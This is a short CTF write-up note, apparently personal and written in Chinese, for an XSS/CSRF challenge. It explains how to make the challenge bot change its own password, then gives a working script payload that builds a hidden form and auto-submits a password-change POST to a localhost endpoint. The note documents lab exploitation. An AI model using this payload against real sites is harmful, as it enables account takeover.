- [[CTF/XSS]]
- [[CTF/CSRF]]
- # 思路
- 让爬虫修改自己的密码为123123即可登陆
- 爬虫没有外网连接，需要让其访问^^127.0.0.1^^
- 本次使用的是POST，需要新建一个虚拟表单
- 用这个：
	- {{embed ((63021a8b-2051-47f1-8372-f413519cd49b))}}
-
- # Payload
- ```html
  <script>
  function httpPost(URL, PARAMS) {
    var temp = document.createElement("form");
    temp.action = URL;
    temp.method = "post";
    temp.style.display = "none";
  
    for (var x in PARAMS) {
      var opt = document.createElement("textarea");
      opt.name = x;
      opt.value = PARAMS[x];
      temp.appendChild(opt);
    }
    document.body.appendChild(temp);
    temp.submit();
  
    return temp;
  }
  httpPost("http://127.0.0.1/api/change.php", {
    "p": "123123"
  });
  </script>
  ```
-